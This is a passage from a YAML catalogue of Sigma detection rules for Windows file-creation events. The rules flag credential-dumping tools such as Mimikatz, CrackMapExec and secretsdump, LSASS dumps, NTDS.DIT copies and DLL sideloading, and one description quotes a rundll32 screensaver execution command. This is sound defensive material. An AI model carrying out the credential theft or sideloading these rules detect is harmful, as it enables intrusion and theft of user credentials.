  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: 736ffa74-5f6f-44ca-94ef-1c0df4f51d2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_crackmapexec_indicators.yml
  name: HackTool - CrackMapExec File Indicators
  description: Detects file creation events with filename patterns used by CrackMapExec.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/byt3bl33d3r/CrackMapExec/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 93d94efc-d7ad-4161-ad7d-1638c4f908d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_dumpert.yml
  name: HackTool - Dumpert Process Dumper Default File
  description: Detects the creation of the default dump file used by Outflank Dumpert
    tool. A process dumper, which dumps the lsass process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/outflanknl/Dumpert
  - https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/
  false_positives:
  - Very unlikely
  notes: ''
- detection_id: 6ea858a8-ba71-4a12-b2cc-5d83312404c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_hivenightmare_file_exports.yml
  name: HackTool - Typical HiveNightmare SAM File Export
  description: Detects files written by the different tools that exploit HiveNightmare
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  - cve.2021-36934
  time_window: ''
  references:
  - https://github.com/GossiTheDog/HiveNightmare
  - https://github.com/FireFart/hivenightmare/
  - https://github.com/WiredPulse/Invoke-HiveNightmare
  - https://twitter.com/cube0x0/status/1418920190759378944
  false_positives:
  - Files that accidentally contain these strings
  notes: ''
- detection_id: bb09dd3e-2b78-4819-8e35-a7c1b874e449
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_inveigh_artefacts.yml
  name: HackTool - Inveigh Execution Artefacts
  description: Detects the presence and execution of Inveigh via dropped artefacts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Output.cs
  - https://github.com/Kevin-Robertson/Inveigh/blob/29d9e3c3a625b3033cdaf4683efaafadcecb9007/Inveigh/Support/Control.cs
  - https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3ab79e90-9fab-4cdf-a7b2-6522bc742adb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_krbrelay_remote_ioc.yml
  name: HackTool - RemoteKrbRelay SMB Relay Secrets Dump Module Indicators
  description: Detects the creation of file with specific names used by RemoteKrbRelay
    SMB Relay attack module.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/CICADA8-Research/RemoteKrbRelay/blob/19ec76ba7aa50c2722b23359bc4541c0a9b2611c/Exploit/RemoteKrbRelay/Relay/Attacks/RemoteRegistry.cs#L31-L40
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9e099d99-44c2-42b6-a6d8-54c3545cab29
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_mimikatz_files.yml
  name: HackTool - Mimikatz Kirbi File Creation
  description: Detects the creation of files created by mimikatz such as ".kirbi",
    "mimilsa.log", etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1558
  tags:
  - attack.credential-access
  - attack.t1558
  time_window: ''
  references:
  - https://cobalt.io/blog/kerberoast-attack-techniques
  - https://pentestlab.blog/2019/10/21/persistence-security-support-provider/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cad1fe90-2406-44dc-bd03-59d0b58fe722
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_nppspy.yml
  name: HackTool - NPPSpy Hacktool Usage
  description: Detects the use of NPPSpy hacktool that stores cleartext passwords
    of users that logged in to a local file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003/T1003.md#atomic-test-2---credential-dumping-with-nppspy
  - https://twitter.com/0gtweet/status/1465282548494487554
  false_positives:
  - Unknown
  notes: ''
- detection_id: 602a1f13-c640-4d73-b053-be9a2fa58b96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_powerup_dllhijacking.yml
  name: HackTool - Powerup Write Hijack DLL
  description: 'Powerup tool''s Write Hijack DLL exploits DLL hijacking for privilege
    escalation.

    In it''s default mode, it builds a self deleting .bat file which executes malicious
    command.

    The detection rule relies on creation of the malicious bat file (debug.bat by
    default).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://powersploit.readthedocs.io/en/latest/Privesc/Write-HijackDll/
  false_positives:
  - Any powershell script that creates bat files
  notes: ''
- detection_id: 847def9e-924d-4e90-b7c4-5f581395a2b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_quarkspw_filedump.yml
  name: HackTool - QuarksPwDump Dump File
  description: Detects a dump file written by QuarksPwDump password dumper
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6e2a900a-ced9-4e4a-a9c2-13e706f9518a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_remote_cred_dump.yml
  name: HackTool - Potential Remote Credential Dumping Activity Via CrackMapExec Or
    Impacket-Secretsdump
  description: Detects default filenames output from the execution of CrackMapExec
    and Impacket-secretsdump against an endpoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.credential-access
  - attack.t1003
  time_window: ''
  references:
  - https://github.com/Porchetta-Industries/CrackMapExec
  - https://github.com/fortra/impacket/blob/ff8c200fd040b04d3b5ff05449646737f836235d/examples/secretsdump.py
  false_positives:
  - Unknown
  notes: ''
- detection_id: e074832a-eada-4fd7-94a1-10642b130e16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_hktl_safetykatz.yml
  name: HackTool - SafetyKatz Dump Indicator
  description: Detects default lsass dump filename generated by SafetyKatz.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/GhostPack/SafetyKatz
  - https://github.com/GhostPack/SafetyKatz/blob/715b311f76eb3a4c8d00a1bd29c6cd1899e450b7/SafetyKatz/Program.cs#L63
  false_positives:
  - Rare legitimate files with similar filename structure
  notes: ''
- detection_id: 03f4ca17-de95-428d-a75a-4ee78b047256
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_impacket_file_indicators.yml
  name: HackTool - Impacket File Indicators
  description: Detects file creation events with filename patterns used by Impacket.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://thedfirreport.com/2025/05/19/another-confluence-bites-the-dust-falling-to-elpaco-team-ransomware/
  - https://github.com/fortra/impacket
  false_positives:
  - Unknown
  notes: ''
- detection_id: dbbd9f66-2ed3-4ca2-98a4-6ea985dd1a1c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_initial_access_dll_search_order_hijacking.yml
  name: Potential Initial Access via DLL Search Order Hijacking
  description: Detects attempts to create a DLL file to a known desktop application
    dependencies folder such as Slack, Teams or OneDrive and by an unusual process.
    This may indicate an attempt to load a malicious module via DLL search order hijacking.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1566
  - T1566.001
  - T1574
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1566
  - attack.t1566.001
  - attack.initial-access
  - attack.t1574
  - attack.t1574.001
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-5d46dd4ac6866b4337ec126be8cee0e115467b3e8703794ba6f6df6432c806bc
  - https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9711de76-5d4f-4c50-a94f-21e4e8f8384d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_install_teamviewer_desktop.yml
  name: Installation of TeamViewer Desktop
  description: TeamViewer_Desktop.exe is create during install
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-1---teamviewer-files-detected-test-on-windows
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1908fcc1-1b92-4272-8214-0fbaf2fa5163
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_iphlpapi_dll_sideloading.yml
  name: Malicious DLL File Dropped in the Teams or OneDrive Folder
  description: 'Detects creation of a malicious DLL file in the location where the
    OneDrive or Team applications

    Upon execution of the Teams or OneDrive application, the dropped malicious DLL
    file ("iphlpapi.dll") is sideloaded

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://blog.cyble.com/2022/07/27/targeted-attacks-being-carried-out-via-dll-sideloading/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2f9356ae-bf43-41b8-b858-4496d83b2acb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_iso_file_mount.yml
  name: ISO File Created Within Temp Folders
  description: Detects the creation of a ISO file in the Outlook temp folder or in
    the Appdata temp folder. Typical of Qakbot TTP from end-July 2022.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://twitter.com/Sam0x90/status/1552011547974696960
  - https://securityaffairs.co/wordpress/133680/malware/dll-sideloading-spread-qakbot.html
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image
  false_positives:
  - Potential FP by sysadmin opening a zip file containing a legitimate ISO file
  notes: ''
- detection_id: 4358e5a5-7542-4dcb-b9f3-87667371839b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_iso_file_recent.yml
  name: ISO or Image Mount Indicator in Recent Files
  description: 'Detects the creation of recent element file that points to an .ISO,
    .IMG, .VHD or .VHDX file as often used in phishing attacks.

    This can be a false positive on server systems but on workstations users should
    rarely mount .iso or .img files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
  - https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore
  - https://blog.emsisoft.com/en/32373/beware-new-wave-of-malware-spreads-via-iso-file-email-attachments/
  - https://insights.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/
  false_positives:
  - Cases in which a user mounts an image file for legitimate reasons
  notes: ''
- detection_id: f92a6f1e-a512-4a15-9735-da09e78d7273
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_lolbin_gather_network_info_script_output.yml
  name: GatherNetworkInfo.VBS Reconnaissance Script Output
  description: Detects creation of files which are the results of executing the built-in
    reconnaissance script "C:\Windows\System32\gatherNetworkInfo.vbs".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://posts.slayerlabs.com/living-off-the-land/#gathernetworkinfovbs
  - https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government
  false_positives:
  - Unknown
  notes: ''
- detection_id: a5a2d357-1ab8-4675-a967-ef9990a59391
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_lsass_default_dump_file_names.yml
  name: LSASS Process Memory Dump Files
  description: Detects creation of files with names used by different memory dumping
    tools to create a memory dump of the LSASS process memory, which contains user
    credentials.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://www.google.com/search?q=procdump+lsass
  - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf
  - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml
  - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
  - https://github.com/helpsystems/nanodump
  - https://github.com/CCob/MirrorDump
  - https://github.com/safedv/RustiveDump/blob/1a9b026b477587becfb62df9677cede619d42030/src/main.rs#L35
  - https://github.com/ricardojoserf/NativeDump/blob/01d8cd17f31f51f5955a38e85cd3c83a17596175/NativeDump/Program.cs#L258
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6902955a-01b7-432c-b32a-6f5f81d8f625
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_lsass_shtinkering.yml
  name: LSASS Process Dump Artefact In CrashDumps Folder
  description: Detects the presence of an LSASS dump file in the "CrashDumps" folder.
    This could be a sign of LSASS credential dumping. Techniques such as the LSASS
    Shtinkering have been seen abusing the Windows Error Reporting to dump said process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/deepinstinct/Lsass-Shtinkering
  - https://media.defcon.org/DEF%20CON%2030/DEF%20CON%2030%20presentations/Asaf%20Gilboa%20-%20LSASS%20Shtinkering%20Abusing%20Windows%20Error%20Reporting%20to%20Dump%20LSASS.pdf
  false_positives:
  - Rare legitimate dump of the process by the operating system due to a crash of
    lsass
  notes: ''
- detection_id: c3e76af5-4ce0-4a14-9c9a-25ceb8fda182
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_lsass_werfault_dump.yml
  name: WerFault LSASS Process Memory Dump
  description: Detects WerFault creating a dump file with a name that indicates that
    the dump file could be an LSASS process memory, which contains user credentials
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/helpsystems/nanodump
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0bcfabcb-7929-47f4-93d6-b33fb67d34d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_mal_adwind.yml
  name: Adwind RAT / JRAT File Artifact
  description: Detects javaw.exe in AppData folder as used by Adwind / JRAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100
  - https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf
  false_positives: []
  notes: ''
- detection_id: 805c55d9-31e6-4846-9878-c34c75054fe9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_mal_octopus_scanner.yml
  name: Octopus Scanner Malware
  description: Detects Octopus Scanner Malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1195
  - T1195.001
  tags:
  - attack.initial-access
  - attack.t1195
  - attack.t1195.001
  time_window: ''
  references:
  - https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain
  false_positives:
  - Unknown
  notes: ''
- detection_id: 318557a5-150c-4c8d-b70e-a9910e199857
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_msdt_susp_directories.yml
  name: File Creation In Suspicious Directory By Msdt.EXE
  description: Detects msdt.exe creating files in suspicious directories which could
    be a sign of exploitation of either Follina or Dogwalk vulnerabilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - cve.2022-30190
  time_window: ''
  references:
  - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd
  - https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c61daa90-3c1e-4f18-af62-8f288b5c9aaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_mysqld_uncommon_file_creation.yml
  name: Uncommon File Creation By Mysql Daemon Process
  description: 'Detects the creation of files with scripting or executable extensions
    by Mysql daemon.

    Which could be an indicator of "User Defined Functions" abuse to download malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://asec.ahnlab.com/en/58878/
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/honeypot-recon-mysql-malware-infection-via-user-defined-functions-udf/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e0b06658-7d1d-4cd3-bf15-03467507ff7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
  name: Suspicious DotNET CLR Usage Log Artifact
  description: Detects the creation of Usage Log files by the CLR (clr.dll). These
    files are named after the executing process once the assembly is finished executing
    for the first time in the (user) session context.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/
  - https://github.com/olafhartong/sysmon-modular/blob/fa1ae53132403d262be2bbd7f17ceea7e15e8c78/11_file_create/include_dotnet.xml
  - https://web.archive.org/web/20221026202428/https://gist.github.com/code-scrap/d7f152ffcdb3e0b02f7f394f5187f008
  - https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html
  false_positives:
  - Rundll32.exe with zzzzInvokeManagedCustomActionOutOfProc in command line and msiexec.exe
    as parent process - https://twitter.com/SBousseaden/status/1388064061087260675
  notes: ''
- detection_id: d7b50671-d1ad-4871-aa60-5aa5b331fe04
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_new_files_in_uncommon_appdata_folder.yml
  name: Suspicious File Creation In Uncommon AppData Folder
  description: Detects the creation of suspicious files and folders inside the user's
    AppData folder but not inside any of the common and well known directories (Local,
    Romaing, LocalLow). This method could be used as a method to bypass detection
    who exclude the AppData folder in fear of FPs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c048f047-7e2a-4888-b302-55f509d4a91d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_new_scr_file.yml
  name: SCR File Write Event
  description: Detects the creation of screensaver files (.scr) outside of system
    folders. Attackers may execute an application as an ".SCR" file using "rundll32.exe
    desk.cpl,InstallScreenSaver" for example.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Libraries/Desk/
  false_positives:
  - The installation of new screen savers by third party software
  notes: ''
- detection_id: 54127bd4-f541-4ac3-afdb-ea073f63f692
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_notepad_plus_plus_persistence.yml
  name: Potential Persistence Via Notepad++ Plugins
  description: Detects creation of new ".dll" files inside the plugins directory of
    a notepad++ installation by a process other than "gup.exe". Which could indicates
    possible persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://pentestlab.blog/2022/02/14/persistence-notepad-plugins/
  false_positives:
  - Possible FPs during first installation of Notepad++
  - Legitimate use of custom plugins by users in order to enhance notepad++ functionalities
  notes: ''
- detection_id: 0b8baa3f-575c-46ee-8715-d6f28cc7d33c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ntds_dit_creation.yml
  name: NTDS.DIT Created
  description: Detects creation of a file named "ntds.dit" (Active Directory Database)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e7050dd-e548-483f-b7d6-527ab4fa784d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_parent_process.yml
  name: NTDS.DIT Creation By Uncommon Parent Process
  description: Detects creation of a file named "ntds.dit" (Active Directory Database)
    by an uncommon parent process or directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/
  - https://pentestlab.blog/tag/ntds-dit/
  - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 11b1ed55-154d-4e82-8ad7-83739298f720
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_process.yml
  name: NTDS.DIT Creation By Uncommon Process
  description: Detects creation of a file named "ntds.dit" (Active Directory Database)
